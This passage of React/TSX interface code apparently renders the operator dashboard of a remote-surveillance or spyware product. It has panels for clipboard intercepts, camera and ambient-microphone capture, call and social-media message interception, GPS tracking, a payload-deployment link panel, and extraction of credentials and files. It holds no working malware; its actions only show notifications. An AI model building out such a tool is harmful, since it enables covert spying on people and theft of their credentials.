                      <div className="text-[10px] font-mono mt-0.5" style={{ color:"#6b8ab0" }}>{r.start} · {r.dur} · {r.size}</div>
                    </div>
                    <Chip color={r.status==="recording"?"#ef4444":"#10b981"}>{r.status}</Chip>
                    <div className="flex gap-1">
                      <button onClick={() => show(`Watching ${r.dev} live stream`,"info")} className="p-1.5 rounded-lg" style={{ background:"rgba(59,130,246,0.15)", color:"#3b82f6" }}><Play size={11}/></button>
                      <button onClick={() => show(`${r.dev} recording downloaded`,"info")} className="p-1.5 rounded-lg" style={{ background:"rgba(16,185,129,0.15)", color:"#10b981" }}><Download size={11}/></button>
                    </div>
                  </div>
                ))}
              </div>
            </div>

            {/* Clipboard */}
            <div className="rounded-2xl overflow-hidden border" style={{ background:"#0a1628", borderColor:"rgba(245,158,11,0.3)" }}>
              <div className="px-5 py-3 flex items-center justify-between border-b" style={{ borderColor:"rgba(245,158,11,0.15)", background:"#0d1930" }}>
                <div className="flex items-center gap-2 font-bold text-sm" style={{ color:"#e2eaf6" }}><Clipboard size={14} color="#f59e0b"/> Clipboard Intercepts</div>
                <ActionBtn onClick={() => show("Clipboard log exported","info")} color="#f59e0b" outline><Download size={11}/>Export</ActionBtn>
              </div>
              <div className="divide-y" style={{ borderColor:"rgba(59,130,246,0.08)" }}>
                {clipLogs.map((c,i) => (
                  <div key={i} className="px-5 py-3">
                    <div className="flex items-center gap-2 mb-1">
                      <span className="text-[10px] font-mono" style={{ color:"#6b8ab0" }}>{c.ts}</span>
                      <Chip color="#f59e0b">{c.dev}</Chip>
                      <span className="text-[10px] font-mono" style={{ color:"#10d9a0" }}>{c.app}</span>
                    </div>
                    <div className="text-xs font-mono px-2 py-1.5 rounded-lg" style={{ background:"#0d1930", color:"#b8cce8" }}>{c.content}</div>
                  </div>
                ))}
              </div>
            </div>
          </div>

          {/* Camera / Mic controls */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div className="p-5 rounded-2xl border" style={{ background:"#0a1628", borderColor:"rgba(6,182,212,0.3)" }}>
              <div className="flex items-center justify-between mb-4">
                <div className="flex items-center gap-2 font-bold text-sm" style={{ color:"#e2eaf6" }}><Camera size={14} color="#10d9a0"/> Camera Control</div>
                <Chip color={camEnabled?"#10d9a0":"#6b8ab0"}>{camEnabled?"ACTIVE":"OFF"}</Chip>
              </div>
              <div className="aspect-video rounded-xl flex items-center justify-center mb-3" style={{ background:"#0d1930", border:"1px solid rgba(6,182,212,0.2)" }}>
                {camEnabled ? <div className="text-center"><div className="w-12 h-12 rounded-full mx-auto mb-2 animate-pulse" style={{ background:"rgba(6,182,212,0.2)" }}><Camera size={24} color="#10d9a0" className="m-auto mt-2.5"/></div><div className="text-xs font-mono" style={{ color:"#10d9a0" }}>LIVE FEED — iPhone-15-Pro</div></div>
                  : <div className="text-xs font-mono" style={{ color:"#1a3060" }}>Camera disabled</div>}
              </div>
              <div className="flex gap-2">
                <ActionBtn onClick={() => show("Snapshot captured from all cameras","info")} color="#10d9a0" outline full><Camera size={12}/>Snapshot All</ActionBtn>
                <ActionBtn onClick={() => show("Camera stream started")} color="#10d9a0" full><Play size={12}/>Stream</ActionBtn>
              </div>
            </div>

            <div className="p-5 rounded-2xl border" style={{ background:"#0a1628", borderColor:"rgba(16,185,129,0.3)" }}>
              <div className="flex items-center justify-between mb-4">
                <div className="flex items-center gap-2 font-bold text-sm" style={{ color:"#e2eaf6" }}><Mic size={14} color="#10b981"/> Microphone Monitor</div>
                <Chip color={micEnabled?"#10b981":"#6b8ab0"}>{micEnabled?"ACTIVE":"OFF"}</Chip>
              </div>
              <div className="space-y-3 mb-3">
                {SEED_DEVICES.filter(d=>d.status!=="offline").slice(0,4).map(d => (
                  <div key={d.id} className="flex items-center gap-3">
                    <span className="text-sm w-5">{OS_ICON[d.os]}</span>
                    <div className="flex-1">
                      <div className="flex justify-between text-[10px] font-mono mb-1" style={{ color:"#6b8ab0" }}>
                        <span>{d.name}</span><span style={{ color:"#10b981" }}>VAD: {micEnabled?"on":"off"}</span>
                      </div>
                      <div className="h-1.5 rounded-full overflow-hidden" style={{ background:"rgba(255,255,255,0.05)" }}>
                        <div className="h-full rounded-full" style={{ width:`${micEnabled?Math.floor(Math.random()*60)+20:0}%`, background:"#10b981" }}/>
                      </div>
                    </div>
                    <button onClick={() => show(`Ambient audio captured from ${d.name}`,"info")} className="p-1 rounded" style={{ color:"#10b981" }}><Download size={11}/></button>
                  </div>
                ))}
              </div>
              <ActionBtn onClick={() => show("Ambient audio recording started on all devices")} color="#10b981" full><Mic size={12}/>Record Ambient Audio</ActionBtn>
            </div>
          </div>
        </div>
      )}


      {/* ── Call Recordings ── */}
      {tab === "surveillance" && (
        <div className="space-y-5">
          <div className="rounded-2xl overflow-hidden border" style={{ background:"#0a1628", borderColor:"rgba(59,130,246,0.25)" }}>
            <div className="px-5 py-3 border-b flex items-center justify-between" style={{ borderColor:"rgba(59,130,246,0.15)", background:"#0d1930" }}>
              <div className="flex items-center gap-2 font-bold text-sm" style={{ color:"#e2eaf6" }}>
                <span style={{ color:"#3b82f6" }}>📞</span> Call Recordings
              </div>
              <div className="flex gap-2">
                <Chip color="#ef4444">● REC</Chip>
                <ActionBtn onClick={() => show("All call recordings exported (calls_2026-07-01.zip)","info")} color="#3b82f6" outline><Download size={11}/>Export All</ActionBtn>
              </div>
            </div>
            <div className="divide-y" style={{ borderColor:"rgba(59,130,246,0.08)" }}>
              {[].map(call => (
                <div key={call.id} className="flex items-center gap-3 px-5 py-3 hover:bg-purple-500/5 transition-colors flex-wrap">
                  <div className={`w-8 h-8 rounded-full flex items-center justify-center flex-shrink-0 text-sm`}
                    style={{ background: call.dir==="incoming"?"rgba(6,182,212,0.15)":"rgba(59,130,246,0.15)" }}>
                    {call.dir==="incoming"?"📲":"📤"}
                  </div>
                  <div className="flex-1 min-w-0">
                    <div className="flex items-center gap-2 flex-wrap">
                      <span className="text-xs font-semibold" style={{ color:"#e2eaf6" }}>{call.dev}</span>
                      <Chip color={call.status==="flagged"?"#ef4444":"#10b981"}>{call.status}</Chip>
                      <Chip color={call.dir==="incoming"?"#10d9a0":"#3b82f6"}>{call.dir}</Chip>
                    </div>
                    <div className="text-[10px] font-mono mt-0.5" style={{ color:"#6b8ab0" }}>
                      {call.from} → {call.to} &nbsp;·&nbsp; {call.dur} &nbsp;·&nbsp; {call.size} &nbsp;·&nbsp; {call.ts}
                    </div>
                  </div>
                  <div className="flex items-center gap-1.5 flex-shrink-0">
                    <button onClick={() => show(`Playing call recording from ${call.dev}`,"info")}
                      className="p-1.5 rounded-lg transition-all hover:opacity-80"
                      style={{ background:"rgba(59,130,246,0.15)", color:"#3b82f6" }} title="Play">
                      <Play size={11}/>
                    </button>
                    <button onClick={() => show(`${call.dev} call recording downloaded`,"info")}
                      className="p-1.5 rounded-lg transition-all hover:opacity-80"
                      style={{ background:"rgba(16,185,129,0.15)", color:"#10b981" }} title="Download">
                      <Download size={11}/>
                    </button>
                    {call.status==="flagged" && (
                      <button onClick={() => show(`Investigation opened for flagged call`,"info")}
                        className="p-1.5 rounded-lg transition-all hover:opacity-80"
                        style={{ background:"rgba(239,68,68,0.15)", color:"#ef4444" }} title="Investigate">
                        <Search size={11}/>
                      </button>
                    )}
                  </div>
                </div>
              ))}
            </div>
          </div>

          {/* Social Media Communications */}
          <div className="rounded-2xl overflow-hidden border" style={{ background:"#0a1628", borderColor:"rgba(6,182,212,0.25)" }}>
            <div className="px-5 py-3 border-b flex items-center justify-between" style={{ borderColor:"rgba(6,182,212,0.15)", background:"#0d1930" }}>
              <div className="flex items-center gap-2 font-bold text-sm" style={{ color:"#e2eaf6" }}>
                💬 Social Media Communications
              </div>
              <div className="flex gap-2">
                <ActionBtn onClick={() => show("Social media dump exported","info")} color="#10d9a0" outline><Download size={11}/>Export</ActionBtn>
              </div>
            </div>

            {/* Platform filter tabs — STATEFUL */}
            {(() => {
              const PLATFORMS_LIST = [
                { id:"all",       label:"All",        icon:"🌐", color:"#3b82f6" },
                { id:"WhatsApp",  label:"WhatsApp",   icon:"💚", color:"#25d366" },
                { id:"Telegram",  label:"Telegram",   icon:"✈️", color:"#0088cc" },
                { id:"Instagram", label:"Instagram",  icon:"📸", color:"#e1306c" },
                { id:"Messenger", label:"Messenger",  icon:"🔵", color:"#0084ff" },
                { id:"Snapchat",  label:"Snapchat",   icon:"👻", color:"#fffc00" },
                { id:"X/Twitter", label:"X / Twitter",icon:"🐦", color:"#1da1f2" },
                { id:"TikTok",    label:"TikTok",     icon:"🎵", color:"#69c9d0" },
                { id:"WeChat",    label:"WeChat",     icon:"🟢", color:"#07c160" },
              ];
              const ALL_MESSAGES = [];
              const visibleMsgs = socialFilter === "all" ? ALL_MESSAGES : ALL_MESSAGES.filter(m => m.platform === socialFilter);
              const activePlatform = PLATFORMS_LIST.find(p => p.id === socialFilter);
              return (
                <>
                  <div className="px-5 pt-3 pb-0 flex gap-2 flex-wrap border-b" style={{ borderColor:"rgba(59,130,246,0.1)" }}>
                    {PLATFORMS_LIST.map(p => {
                      const count = p.id === "all" ? ALL_MESSAGES.length : ALL_MESSAGES.filter(m => m.platform === p.id).length;
                      const active = socialFilter === p.id;
                      return (
                        <button key={p.id}
                          onClick={() => setSocialFilter(p.id)}
                          className="flex items-center gap-1.5 px-3 py-2 rounded-t-lg text-xs font-bold transition-all"
                          style={{
                            background: active ? p.color+"33" : p.color+"15",
                            color: p.color,
                            border: `1px solid ${p.color}${active?"88":"33"}`,
                            borderBottom: active ? `2px solid ${p.color}` : "1px solid transparent",
                            opacity: count === 0 ? 0.4 : 1,
                          }}>
                          <span>{p.icon}</span>
                          {p.label}
                          <span className="px-1 py-0.5 rounded text-[9px]" style={{ background: active?p.color+"44":p.color+"22" }}>{count}</span>
                        </button>
                      );
                    })}
                  </div>

                  {visibleMsgs.length === 0 ? (
                    <div className="px-5 py-10 text-center text-sm" style={{ color:"#6b8ab0" }}>
                      No {activePlatform?.label} messages intercepted yet
                    </div>
                  ) : null}

                  <div className="divide-y" style={{ borderColor:"rgba(59,130,246,0.08)" }}>
                    {visibleMsgs.map((msg, i) => (
                <div key={i} className={`flex items-start gap-3 px-5 py-3 hover:bg-purple-500/5 transition-colors ${msg.flagged?"border-l-2":""}`}
                  style={{ borderLeftColor: msg.flagged?"#ef4444":"transparent" }}>
                  <div className="w-9 h-9 rounded-xl flex items-center justify-center flex-shrink-0 text-lg"
                    style={{ background:`${msg.color}18`, border:`1px solid ${msg.color}30` }}>
                    {msg.icon}
                  </div>
                  <div className="flex-1 min-w-0">
                    <div className="flex items-center gap-2 flex-wrap mb-1">
                      <span className="text-[10px] font-bold" style={{ color:msg.color }}>{msg.platform}</span>
                      <span className="text-[10px] font-mono" style={{ color:"#6b8ab0" }}>{msg.dev}</span>
                      <span className="text-[10px] font-semibold" style={{ color:"#b8cce8" }}>{msg.from}</span>
                      <ArrowRight size={9} color="#6b8ab0"/>
                      <span className="text-[10px]" style={{ color:"#6b8ab0" }}>{msg.to}</span>
                      <span className="ml-auto text-[10px] font-mono" style={{ color:"#6b8ab0" }}>{msg.ts}</span>
                    </div>
                    <div className={`text-xs px-3 py-2 rounded-xl`}
                      style={{ background: msg.flagged?"rgba(239,68,68,0.08)":"#0d1930", color:"#b8cce8", border:`1px solid ${msg.flagged?"rgba(239,68,68,0.25)":"rgba(59,130,246,0.1)"}` }}>
                      {msg.type==="voice"&&<span style={{color:"#10b981"}}>🎙 </span>}
                      {msg.type==="image"&&<span style={{color:"#10d9a0"}}>🖼 </span>}
                      {msg.type==="snap"&&<span style={{color:"#fffc00"}}>👻 </span>}
                      {msg.msg}
                    </div>
                  </div>
                  <div className="flex flex-col gap-1 flex-shrink-0">
                    {msg.flagged && <Chip color="#ef4444">flagged</Chip>}
                    <Chip color={msg.color}>{msg.type}</Chip>
                    <button onClick={() => show(`${msg.platform} message saved to evidence`,"info")}
                      className="p-1 rounded" style={{ color:"#10b981" }} title="Save">
                      <Download size={10}/>
                    </button>
                  </div>
                </div>
              ))}
            </div>
                </>
              );
            })()}

            <div className="px-5 py-3 flex items-center justify-between border-t" style={{ borderColor:"rgba(59,130,246,0.12)" }}>
              <div className="text-[10px] font-mono" style={{ color:"#6b8ab0" }}>
                {socialFilter==="all" ? "12 messages" : `Filtered: ${socialFilter}`}
                &nbsp;·&nbsp; <span style={{ color:"#ef4444" }}>5 flagged</span>
                &nbsp;·&nbsp; 9 platforms monitored
              </div>
              <div className="flex gap-2">
                <ActionBtn onClick={() => setSocialFilter("all")} color="#6b8ab0" outline><RefreshCw size={11}/>Show All</ActionBtn>
                <ActionBtn onClick={() => show("Auto-alert enabled for flagged keywords")} color="#10d9a0" outline><Bell size={11}/>Auto-Alert</ActionBtn>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* ══ COPY SOFTWARE LINK / DEPLOY PANEL ══ */}
      {tab === "surveillance" && (
        <DeployLinkPanel show={show} />
      )}

      {/* ── Camera Recordings ── */}
      {tab === "surveillance" && (
        <div className="space-y-5">
          <div className="rounded-2xl overflow-hidden border" style={{ background:"#0a1628", borderColor:"rgba(6,182,212,0.3)" }}>
            <div className="px-5 py-3 border-b flex items-center justify-between" style={{ borderColor:"rgba(6,182,212,0.15)", background:"#0d1930" }}>
              <div className="flex items-center gap-2 font-bold text-sm" style={{ color:"#e2eaf6" }}>
                <Camera size={14} color="#10d9a0"/> Camera Recordings
              </div>
              <div className="flex gap-2 flex-wrap">
                {/* Camera type filter */}
                {["all","motion","scheduled","manual","flagged"].map(f => (
                  <button key={f} onClick={() => setCamRecFilter(f)}
                    className="px-3 py-1 rounded-lg text-[10px] font-mono capitalize transition-all font-bold"
                    style={{
                      background: camRecFilter===f ? "rgba(6,182,212,0.25)" : "transparent",
                      color: camRecFilter===f ? "#10d9a0" : "#6b8ab0",
                      border: `1px solid ${camRecFilter===f?"rgba(6,182,212,0.5)":"transparent"}`,
                    }}>
                    {f}
                  </button>
                ))}
                <ActionBtn onClick={() => show("All camera recordings exported (cameras_2026-07-01.zip)","info")} color="#10d9a0" outline>
                  <Download size={11}/>Export All
                </ActionBtn>
              </div>
            </div>

            {/* Live camera grid */}
            <div className="p-4 grid grid-cols-2 md:grid-cols-4 gap-3 border-b" style={{ borderColor:"rgba(59,130,246,0.1)" }}>
              {SEED_DEVICES.filter(d=>d.status!=="offline").slice(0,4).map(d => (
                <div key={d.id} className="rounded-xl overflow-hidden" style={{ border:"1px solid rgba(6,182,212,0.25)" }}>
                  <div className="aspect-video flex items-center justify-center relative"
                    style={{ background:"linear-gradient(135deg,#060512,#030b16)" }}>
                    <div className="text-center">
                      <Camera size={20} color="#10d9a0" className="mx-auto mb-1 opacity-60"/>
                      <div className="text-[9px] font-mono" style={{ color:"#1a3060" }}>FEED</div>
                    </div>
                    <div className="absolute top-1.5 left-1.5 flex items-center gap-1 px-1.5 py-0.5 rounded"
                      style={{ background:"rgba(239,68,68,0.85)" }}>
                      <div className="w-1.5 h-1.5 rounded-full animate-pulse" style={{ background:"#fff" }}/>
                      <span className="text-[8px] font-bold text-white">LIVE</span>
                    </div>
                    <button onClick={() => show(`${d.name} camera captured`,"info")}
                      className="absolute bottom-1.5 right-1.5 p-1 rounded"
                      style={{ background:"rgba(6,182,212,0.3)", color:"#10d9a0" }}>
                      <Camera size={10}/>
                    </button>
                  </div>
                  <div className="px-2 py-1.5" style={{ background:"#0d1930" }}>
                    <div className="text-[9px] font-mono truncate" style={{ color:"#b8cce8" }}>{d.name}</div>
                    <div className="text-[8px] font-mono" style={{ color:"#6b8ab0" }}>{OS_LABEL[d.os]}</div>
                  </div>
                </div>
              ))}
            </div>

            {/* Recording log */}
            {(() => {
              const CAM_RECS = [];
              const visible = camRecFilter === "all" ? CAM_RECS
                : camRecFilter === "flagged" ? CAM_RECS.filter(r=>r.flagged)
                : CAM_RECS.filter(r=>r.trigger===camRecFilter);
              const trigColor: Record<string,string> = { motion:"#ef4444", scheduled:"#3b82f6", manual:"#10d9a0", flagged:"#f59e0b" };
              return (
                <div className="divide-y" style={{ borderColor:"rgba(59,130,246,0.08)" }}>
                  {visible.length === 0 && (
                    <div className="px-5 py-8 text-center text-sm" style={{ color:"#6b8ab0" }}>No recordings match filter "{camRecFilter}"</div>
                  )}
                  {visible.map(r => (
                    <div key={r.id} className={`flex items-center gap-4 px-5 py-3 hover:bg-cyan-500/5 transition-colors ${r.flagged?"border-l-2":""}`}
                      style={{ borderLeftColor:r.flagged?"#ef4444":"transparent" }}>
                      <div className="w-16 h-12 rounded-lg flex items-center justify-center flex-shrink-0 text-2xl"
                        style={{ background:"#0d1930", border:"1px solid rgba(6,182,212,0.2)" }}>
                        {r.thumb}
                      </div>
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center gap-2 flex-wrap mb-1">
                          <span className="font-semibold text-xs" style={{ color:"#e2eaf6" }}>{r.dev}</span>
                          <span className="text-[10px] font-mono" style={{ color:"#10d9a0" }}>{r.cam}</span>
                          {r.flagged && <Chip color="#ef4444">⚠ flagged</Chip>}
                        </div>
                        <div className="flex items-center gap-3 text-[10px] font-mono" style={{ color:"#6b8ab0" }}>
                          <span style={{ color: trigColor[r.trigger] ?? "#6b8ab0" }}>● {r.trigger}</span>
                          <span>{r.dur}</span>
                          <span>{r.size}</span>
                          <span>{r.ts}</span>
                        </div>
                      </div>
                      <div className="flex items-center gap-1.5 flex-shrink-0">
                        <button onClick={() => show(`Playing ${r.cam} recording from ${r.dev}`,"info")}
                          className="p-2 rounded-lg" style={{ background:"rgba(59,130,246,0.15)", color:"#3b82f6" }} title="Play">
                          <Play size={12}/>
                        </button>
                        <button onClick={() => show(`${r.dev} camera recording downloaded`,"info")}
                          className="p-2 rounded-lg" style={{ background:"rgba(16,185,129,0.15)", color:"#10b981" }} title="Download">
                          <Download size={12}/>
                        </button>
                        {r.flagged && (
                          <button onClick={() => show(`Evidence flagged: ${r.dev} ${r.ts}`,"info")}
                            className="p-2 rounded-lg" style={{ background:"rgba(239,68,68,0.15)", color:"#ef4444" }} title="Flag Evidence">
                            <AlertTriangle size={12}/>
                          </button>
                        )}
                      </div>
                    </div>
                  ))}
                </div>
              );
            })()}

            <div className="px-5 py-3 flex items-center justify-between border-t" style={{ borderColor:"rgba(59,130,246,0.12)" }}>
              <div className="text-[10px] font-mono" style={{ color:"#6b8ab0" }}>
                6 recordings &nbsp;·&nbsp; <span style={{color:"#ef4444"}}>3 flagged</span>
                &nbsp;·&nbsp; <span style={{color:"#10b981"}}>4 cameras live</span>
                &nbsp;·&nbsp; Night vision: <span style={{color:"#3b82f6"}}>IR auto</span>
              </div>
              <div className="flex gap-2">
                <ActionBtn onClick={() => show("Motion detection sensitivity set to HIGH")} color="#f59e0b" outline><Bell size={11}/>Motion Alert</ActionBtn>
                <ActionBtn onClick={() => show("Snapshot taken from all active cameras","info")} color="#10d9a0" outline><Camera size={11}/>Snapshot All</ActionBtn>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* ══ LOCATION ══ */}
      {tab === "location" && (
        <div className="space-y-5">
          <div className="flex items-center justify-between flex-wrap gap-3">
            <div>
              <h2 className="font-black text-lg" style={{ color:"#e2eaf6" }}>Location & Movement Intelligence</h2>
              <p className="text-xs mt-0.5" style={{ color:"#6b8ab0" }}>Real-time GPS · Cell triangulation · Geofencing · Behavioral patterns</p>
            </div>
            <div className="flex gap-2">
              <ActionBtn onClick={() => show("GPS ping sent to all mobile devices")} color="#10b981" outline><Signal size={13}/>Ping All</ActionBtn>
              <ActionBtn onClick={() => show("Location history exported","info")} color="#3b82f6" outline><Download size={13}/>Export History</ActionBtn>
            </div>
          </div>

          {/* Map placeholder */}
          <div className="relative rounded-2xl overflow-hidden" style={{ background:"#060512", border:"1px solid rgba(16,185,129,0.3)", height:280 }}>
            <div className="absolute inset-0 flex items-center justify-center flex-col gap-2"
              style={{ backgroundImage:"linear-gradient(rgba(16,185,129,0.03) 1px,transparent 1px),linear-gradient(90deg,rgba(16,185,129,0.03) 1px,transparent 1px)", backgroundSize:"32px 32px" }}>
              <div className="text-xs font-mono" style={{ color:"#1a3060" }}>[ SATELLITE VIEW — CLASSIFIED ]</div>
              {geoDevices.map((d,i) => (
                <div key={d.id} className="absolute flex items-center gap-1.5 px-2 py-1 rounded-full"
                  style={{ top:`${20+i*14}%`, left:`${10+i*17}%`, background:"rgba(16,185,129,0.15)", border:"1px solid rgba(16,185,129,0.4)" }}>
                  <div className="w-2 h-2 rounded-full animate-pulse" style={{ background:"#10b981" }}/>
                  <span className="text-[9px] font-mono" style={{ color:"#10b981" }}>{d.name}</span>
                </div>
              ))}
            </div>
            <div className="absolute bottom-3 left-3 text-[10px] font-mono" style={{ color:"#10b981" }}>● {geoDevices.length} devices tracked live</div>
            <div className="absolute bottom-3 right-3 text-[10px] font-mono" style={{ color:"#6b8ab0" }}>GPS · Cell · WiFi triangulation</div>
          </div>

          {/* Device coordinates */}
          <div className="rounded-2xl overflow-hidden border" style={{ background:"#0a1628", borderColor:"rgba(59,130,246,0.2)" }}>
            <div className="px-5 py-3 border-b" style={{ borderColor:"rgba(59,130,246,0.15)", background:"#0d1930" }}>
              <div className="font-bold text-sm" style={{ color:"#e2eaf6" }}>Live Coordinates</div>
            </div>
            <table className="w-full text-xs min-w-[560px]">
              <thead><tr style={{ borderBottom:"1px solid rgba(59,130,246,0.1)", background:"#0d1930" }}>
                {["Device","Location","Lat","Lng","Accuracy","Speed","Updated","Actions"].map(h=>(
                  <th key={h} className="text-left px-4 py-2 text-[9px] font-mono uppercase tracking-wider" style={{ color:"#6b8ab0" }}>{h}</th>
                ))}
              </tr></thead>
              <tbody>
                {geoDevices.map(d => (
                  <tr key={d.id} className="hover:bg-purple-500/5 transition-colors" style={{ borderBottom:"1px solid rgba(59,130,246,0.07)" }}>
                    <td className="px-4 py-2.5 font-semibold" style={{ color:"#e2eaf6" }}>{d.name}</td>
                    <td className="px-4 py-2.5 font-mono" style={{ color:"#10b981" }}>{d.loc}</td>
                    <td className="px-4 py-2.5 font-mono" style={{ color:"#6b8ab0" }}>{d.lat.toFixed(4)}</td>
                    <td className="px-4 py-2.5 font-mono" style={{ color:"#6b8ab0" }}>{d.lng.toFixed(4)}</td>
                    <td className="px-4 py-2.5 font-mono" style={{ color:"#10d9a0" }}>{d.acc}</td>
                    <td className="px-4 py-2.5 font-mono" style={{ color:d.spd!=="0 km/h"?"#f59e0b":"#6b8ab0" }}>{d.spd}</td>
                    <td className="px-4 py-2.5 font-mono" style={{ color:"#6b8ab0" }}>{d.upd}</td>
                    <td className="px-4 py-2.5">
                      <div className="flex gap-1">
                        <button onClick={() => show(`Location history for ${d.name} opened`,"info")} className="p-1 rounded" style={{ color:"#10b981" }} title="History"><Activity size={11}/></button>
                        <button onClick={() => show(`Tracking ${d.name} — ping every 10s`)} className="p-1 rounded" style={{ color:"#3b82f6" }} title="Track"><Signal size={11}/></button>
                      </div>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>

          {/* Geofences */}
          <div className="rounded-2xl border p-5" style={{ background:"#0a1628", borderColor:"rgba(59,130,246,0.2)" }}>
            <div className="flex items-center justify-between mb-4">
              <div className="font-bold text-sm" style={{ color:"#e2eaf6" }}>Geofence Zones</div>
              <ActionBtn onClick={() => { show("New geofence zone created"); setGeofences(g=>[...g,{id:`g${Date.now()}`,name:"New Zone",lat:0,lng:0,radius:"200m",active:true,breached:false}]); }} color="#10b981" outline><Signal size={12}/>Add Zone</ActionBtn>
            </div>
            <div className="space-y-2">
              {geofences.map(g => (
                <div key={g.id} className="flex items-center gap-4 px-4 py-3 rounded-xl border" style={{ background:"#0d1930", borderColor: g.breached?"rgba(239,68,68,0.4)":"rgba(59,130,246,0.15)" }}>
                  <div className="w-8 h-8 rounded-lg flex items-center justify-center" style={{ background:`rgba(16,185,129,0.15)` }}><Signal size={14} color="#10b981"/></div>
                  <div className="flex-1">
                    <div className="font-semibold text-sm" style={{ color:"#e2eaf6" }}>{g.name}</div>
                    <div className="text-[10px] font-mono" style={{ color:"#6b8ab0" }}>Radius: {g.radius} · Lat {g.lat.toFixed(4)} Lng {g.lng.toFixed(4)}</div>
                  </div>
                  {g.breached && <Chip color="#ef4444">BREACHED</Chip>}
                  <div className="w-8 h-4 rounded-full relative cursor-pointer" onClick={() => setGeofences(p=>p.map(x=>x.id===g.id?{...x,active:!x.active}:x))} style={{ background: g.active?"#10b981":"#0f1e3a" }}>
                    <div className="absolute top-0.5 w-3 h-3 rounded-full transition-all" style={{ left:g.active?"17px":"2px", background:"#fff" }}/>
                  </div>
                  <button onClick={() => setGeofences(p=>p.filter(x=>x.id!==g.id))} className="p-1 rounded" style={{ color:"#ef4444" }}><X size={12}/></button>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}


      {/* Movement pattern analysis appended to location tab */}
      {tab === "location" && (
        <div className="rounded-2xl overflow-hidden border" style={{ background:"#0a1628", borderColor:"rgba(16,185,129,0.2)" }}>
          <div className="px-5 py-3 border-b flex items-center justify-between" style={{ borderColor:"rgba(16,185,129,0.15)", background:"#0d1930" }}>
            <div className="font-bold text-sm" style={{ color:"#e2eaf6" }}>AI Movement Pattern Analysis</div>
            <Chip color="#10b981">AI ACTIVE</Chip>
          </div>
          <div className="p-5 grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
            {[].map((m,i) => (
              <div key={i} className="p-4 rounded-xl border" style={{ background:"#0d1930", borderColor: m.anomaly?"rgba(239,68,68,0.3)":"rgba(16,185,129,0.15)" }}>
                <div className="flex items-center gap-2 mb-2">
                  <Chip color={m.risk==="high"?"#ef4444":m.risk==="medium"?"#f59e0b":"#10b981"}>{m.risk}</Chip>
                  {m.anomaly && <Chip color="#ef4444">ANOMALY</Chip>}
                </div>
                <div className="font-bold text-xs mb-0.5" style={{ color:"#e2eaf6" }}>{m.dev}</div>
                <div className="text-[10px] font-semibold mb-2" style={{ color:"#10d9a0" }}>{m.pattern}</div>
                <div className="text-[10px] leading-relaxed" style={{ color:"#6b8ab0" }}>{m.insight}</div>
                {m.anomaly && (
                  <button onClick={() => show(`Alert created for ${m.dev} movement anomaly`,"info")}
                    className="mt-2 w-full text-[10px] font-bold py-1.5 rounded-lg" style={{ background:"rgba(239,68,68,0.15)", color:"#ef4444", border:"1px solid rgba(239,68,68,0.3)" }}>
                    Create Alert
                  </button>
                )}
              </div>
            ))}
          </div>
        </div>
      )}

      {/* ══ EXTRACTION ══ */}
      {tab === "extraction" && (
        <div className="space-y-5">
          <div className="flex items-center justify-between flex-wrap gap-3">
            <div>
              <h2 className="font-black text-lg" style={{ color:"#e2eaf6" }}>Data Extraction</h2>
              <p className="text-xs mt-0.5" style={{ color:"#6b8ab0" }}>Contacts · SMS · Browser history · Files · Credentials · Media</p>
            </div>
            <div className="flex gap-2">
              <ActionBtn onClick={() => show("Full extraction job queued for all devices")} color="#3b82f6"><Download size={13}/>Extract All</ActionBtn>
            </div>
          </div>

          {/* Device selector for quick extract */}
          <div className="flex items-center gap-3 flex-wrap">
            <span className="text-xs font-mono" style={{ color:"#6b8ab0" }}>Quick extract from:</span>
            <div className="flex flex-wrap gap-1">
              {["EXEC-LAPTOP-01","MacBook-Pro-M3","iPhone-15-Pro","Galaxy-S24-Ultra","DEVBOX-ARCH"].map(d => (
                <button key={d} onClick={() => setQuickExtractDev(d)}
                  className="px-3 py-1 rounded-lg text-[10px] font-mono font-bold transition-all"
                  style={{
                    background: quickExtractDev===d ? "rgba(59,130,246,0.3)" : "rgba(59,130,246,0.08)",
                    color: quickExtractDev===d ? "#a78bfa" : "#6b8ab0",
                    border: `1px solid ${quickExtractDev===d ? "rgba(59,130,246,0.5)" : "rgba(59,130,246,0.15)"}`,
                  }}>{d}</button>
              ))}
            </div>
          </div>

          {/* Quick extract buttons */}
          <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-6 gap-3">
            {[
              { label:"Browser History", icon:<BookOpen size={14}/>, color:"#10d9a0" },
              { label:"Contacts",        icon:<User size={14}/>,     color:"#10b981" },
              { label:"SMS & Calls",     icon:<Mic size={14}/>,      color:"#3b82f6" },
              { label:"File System",     icon:<FolderOpen size={14}/>,color:"#f59e0b"},
              { label:"Credentials",     icon:<Key size={14}/>,      color:"#ef4444" },
              { label:"Media Vault",     icon:<Camera size={14}/>,   color:"#a855f7" },
            ].map(({ label, icon, color }) => (
              <div key={label} className="p-4 rounded-xl border flex flex-col items-center gap-2 text-center"
                style={{ background:`${color}12`, borderColor:`${color}30` }}>
                <span style={{ color }}>{icon}</span>
                <span className="text-[10px] font-bold" style={{ color }}>{label}</span>
                <div className="flex gap-1 w-full mt-1">
                  <button onClick={() => { setViewQuickType(label); setQuickExtractDev(quickExtractDev); }}
                    className="flex-1 text-[9px] font-bold py-1 rounded-lg transition-all hover:opacity-80"
                    style={{ background:`${color}22`, color }}>View</button>
                  <button onClick={() => show(`${label} extraction started`)}
                    className="flex-1 text-[9px] font-bold py-1 rounded-lg transition-all hover:opacity-80"
                    style={{ background:`${color}22`, color }}>Extract</button>
                </div>
              </div>
            ))}
          </div>

          {/* Extraction jobs */}
          <div className="rounded-2xl overflow-hidden border" style={{ background:"#0a1628", borderColor:"rgba(59,130,246,0.2)" }}>
            <div className="px-5 py-3 border-b flex items-center justify-between" style={{ borderColor:"rgba(59,130,246,0.15)", background:"#0d1930" }}>
              <div className="font-bold text-sm" style={{ color:"#e2eaf6" }}>Extraction Jobs</div>
              <ActionBtn onClick={() => show("All extraction results downloaded as ZIP","info")} color="#3b82f6" outline><Download size={11}/>Download All</ActionBtn>
            </div>
            <table className="w-full text-xs min-w-[580px]">
              <thead><tr style={{ borderBottom:"1px solid rgba(59,130,246,0.1)", background:"#0d1930" }}>
